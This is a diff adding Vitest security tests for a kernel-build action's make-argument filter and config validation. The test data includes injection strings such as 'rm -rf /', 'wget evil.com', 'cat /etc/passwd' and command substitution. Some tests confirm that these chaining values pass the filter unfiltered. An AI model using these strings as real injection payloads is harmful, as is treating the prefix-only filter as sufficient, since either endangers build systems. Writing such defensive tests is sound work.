@@ -1,5 +1,6 @@
 import { describe, it, expect, vi, beforeEach } from 'vitest';
 import { BuildConfig, buildKernel, isBuildSuccessful } from '../src/builder';
+import { filterMakeArgs, parseExtraMakeArgs } from '../src/utils';
 import * as fs from 'fs';
 import * as core from '@actions/core';
 import * as exec from '@actions/exec';
@@ -383,5 +384,229 @@ describe('isBuildSuccessful', () => {
     const result = isBuildSuccessful('/kernel', 'arm64');
 
     expect(result).toBe(false);
+  });
+});
+
+describe('Dangerous command detection', () => {
+  describe('filterMakeArgs dangerous parameter filtering', () => {
+    it('filters out SHELL injection attempts', () => {
+      const args = ['SHELL=/bin/bash', 'SHELL=/bin/sh -c "rm -rf /"', '-j8'];
+      const filtered = filterMakeArgs(args);
+      expect(filtered).toEqual(['-j8']);
+      expect(filtered).not.toContain('SHELL=/bin/bash');
+      expect(filtered).not.toContain('SHELL=/bin/sh -c "rm -rf /"');
+    });
+
+    it('filters out compiler override attempts (CC, CXX, LD)', () => {
+      const args = ['CC=gcc', 'CXX=g++', 'LD=ld', 'AS=as', 'AR=ar', '-j8'];
+      const filtered = filterMakeArgs(args);
+      expect(filtered).toEqual(['-j8']);
+    });
+
+    it('filters out cross-compile override attempts', () => {
+      const args = ['CROSS_COMPILE=malicious-', 'CLANG_TRIPLE=aarch64-linux-gnu-', '-j8'];
+      const filtered = filterMakeArgs(args);
+      expect(filtered).toEqual(['-j8']);
+    });
+
+    it('filters out binary tool override attempts', () => {
+      const args = [
+        'NM=nm',
+        'STRIP=strip',
+        'OBJCOPY=objcopy',
+        'OBJDUMP=objdump',
+        'HOSTCC=gcc',
+        'KBUILD_HOSTCC=clang',
+        '-j8',
+      ];
+      const filtered = filterMakeArgs(args);
+      expect(filtered).toEqual(['-j8']);
+    });
+
+    it('filters out LLVM/CLVM override attempts', () => {
+      const args = ['LLVM=1', 'CLVM=1', '-j8'];
+      const filtered = filterMakeArgs(args);
+      expect(filtered).toEqual(['-j8']);
+    });
+
+    it('filters out output directory override attempts', () => {
+      const args = ['O=/malicious/path', 'O=../escape', '-j8'];
+      const filtered = filterMakeArgs(args);
+      expect(filtered).toEqual(['-j8']);
+    });
+
+    it('filters out ARCH override attempts', () => {
+      const args = ['ARCH=malicious', 'ARCH=x86;rm -rf /', '-j8'];
+      const filtered = filterMakeArgs(args);
+      expect(filtered).toEqual(['-j8']);
+    });
+
+    it('filters out MAKEFLAGS and MAKE override attempts', () => {
+      const args = ['MAKEFLAGS=--debug', 'MAKE=make', '-j8'];
+      const filtered = filterMakeArgs(args);
+      expect(filtered).toEqual(['-j8']);
+    });
+
+    it('allows safe make arguments', () => {
+      const args = ['-j8', 'V=1', 'LOCALVERSION=-custom', 'menuconfig'];
+      const filtered = filterMakeArgs(args);
+      expect(filtered).toEqual(['-j8', 'V=1', 'LOCALVERSION=-custom', 'menuconfig']);
+    });
+
+    it('returns empty array when all args are dangerous', () => {
+      const args = ['CC=gcc', 'LD=ld', 'SHELL=/bin/sh'];
+      const filtered = filterMakeArgs(args);
+      expect(filtered).toEqual([]);
+    });
+
+    it('handles empty argument array', () => {
+      const filtered = filterMakeArgs([]);
+      expect(filtered).toEqual([]);
+    });
+  });
+
+  describe('parseExtraMakeArgs security', () => {
+    it('returns empty array for invalid JSON', () => {
+      const args = parseExtraMakeArgs('not valid json');
+      expect(args).toEqual([]);
+    });
+
+    it('returns empty array for non-array JSON', () => {
+      const args = parseExtraMakeArgs('{"key": "value"}');
+      expect(args).toEqual([]);
+    });
+
+    it('correctly parses valid JSON array', () => {
+      const args = parseExtraMakeArgs('["-j8", "V=1"]');
+      expect(args).toEqual(['-j8', 'V=1']);
+    });
+
+    it('returns empty array for empty string', () => {
+      const args = parseExtraMakeArgs('');
+      expect(args).toEqual([]);
+    });
+  });
+
+  describe('Command injection pattern detection', () => {
+    it('allows arguments with semicolons (filterMakeArgs does not check command chaining)', () => {
+      const args = ['-j8; rm -rf /', 'V=1; cat /etc/passwd'];
+      const filtered = filterMakeArgs(args);
+      // filterMakeArgs only checks prefixes, not command chaining characters
+      expect(filtered).toEqual(args);
+    });
+
+    it('allows arguments with ampersands (filterMakeArgs does not check command chaining)', () => {
+      const args = ['-j8 && wget malicious.com', 'V=1 && ./backdoor'];
+      const filtered = filterMakeArgs(args);
+      expect(filtered).toEqual(args);
+    });
+
+    it('allows arguments with backticks (filterMakeArgs does not check command substitution)', () => {
+      const args = ['-j8 `cat /etc/passwd`', 'V=`whoami`'];
+      const filtered = filterMakeArgs(args);
+      expect(filtered).toEqual(args);
+    });
+
+    it('allows arguments with dollar parentheses (filterMakeArgs does not check command substitution)', () => {
+      const args = ['-j8 $(cat /etc/passwd)', 'V=$(whoami)'];
+      const filtered = filterMakeArgs(args);
+      expect(filtered).toEqual(args);
+    });
+
+    it('allows arguments with pipes (filterMakeArgs does not check pipes)', () => {
+      const args = ['-j8 | cat /etc/passwd', 'V=1 | wget evil.com'];
+      const filtered = filterMakeArgs(args);
+      expect(filtered).toEqual(args);
+    });
+  });
+
+  describe('Path traversal in make arguments', () => {
+    it('allows LOCALVERSION with parent directory traversal (not filtered by filterMakeArgs)', () => {
+      const argsWithTraversal = ['LOCALVERSION=../escape', 'KBUILD_OUTPUT=../../etc', '-j8'];
+      const filtered = filterMakeArgs(argsWithTraversal);
+      // Note: filterMakeArgs does not filter LOCALVERSION or KBUILD_OUTPUT
+      // Path traversal should be handled at input validation layer
+      expect(filtered).toEqual(argsWithTraversal);
+    });
+
+    it('allows legitimate paths without traversal', () => {
+      const args = ['LOCALVERSION=-custom', 'KBUILD_OUTPUT=out', '-j8'];
+      const filtered = filterMakeArgs(args);
+      expect(filtered).toEqual(args);
+    });
+  });
+
+  describe('buildKernel security integration', () => {
+    it('rejects config starting with hyphen (command injection prevention)', async () => {
+      const maliciousConfigs = ['-malicious', '--help', '-j8', '-C /etc'];
+
+      for (const maliciousConfig of maliciousConfigs) {
+        const config: BuildConfig = {
+          kernelDir: '/kernel',
+          arch: 'arm64',
+          config: maliciousConfig,
+          toolchain: {},
+          extraMakeArgs: '',
+          useCcache: false,
+        };
+
+        await expect(buildKernel(config)).rejects.toThrow(
+          'config input must not start with a hyphen'
+        );
+      }
+    });
+
+    it('accepts configs with command chaining characters (not starting with hyphen)', async () => {
+      vi.mocked(fs.mkdirSync).mockImplementation(() => undefined);
+      vi.mocked(fs.appendFileSync).mockImplementation(() => undefined);
+      vi.mocked(exec.exec).mockResolvedValue(0);
+
+      const configsWithSpecialChars = ['defconfig_custom', 'my_defconfig_v2'];
+
+      for (const testConfig of configsWithSpecialChars) {
+        vi.clearAllMocks();
+        vi.mocked(fs.mkdirSync).mockImplementation(() => undefined);
+        vi.mocked(fs.appendFileSync).mockImplementation(() => undefined);
+        vi.mocked(exec.exec).mockResolvedValue(0);
+
+        const config: BuildConfig = {
+          kernelDir: '/kernel',
+          arch: 'arm64',
+          config: testConfig,
+          toolchain: {},
+          extraMakeArgs: '',
+          useCcache: false,
+        };
+
+        await expect(buildKernel(config)).resolves.not.toThrow();
+      }
+    });
+
+    it('filters dangerous args from extraMakeArgs during build', async () => {
+      vi.mocked(fs.mkdirSync).mockImplementation(() => undefined);
+      vi.mocked(fs.appendFileSync).mockImplementation(() => undefined);
+      vi.mocked(exec.exec).mockResolvedValue(0);
+
+      const config: BuildConfig = {
+        kernelDir: '/kernel',
+        arch: 'arm64',
+        config: 'defconfig',
+        toolchain: {},
+        extraMakeArgs: '["SHELL=/bin/sh", "CC=gcc", "-j8", "V=1"]',
+        useCcache: false,
+      };
+
+      await buildKernel(config);
+
+      expect(exec.exec).toHaveBeenCalledWith(
+        'make',
+        expect.arrayContaining(['-j8', 'V=1']),
+        expect.any(Object)
+      );
+
+      const callArgs = vi.mocked(exec.exec).mock.calls[0][1] as string[];
+      expect(callArgs).not.toContain('SHELL=/bin/sh');
+      expect(callArgs).not.toContain('CC=gcc');
+    });
   });
 });
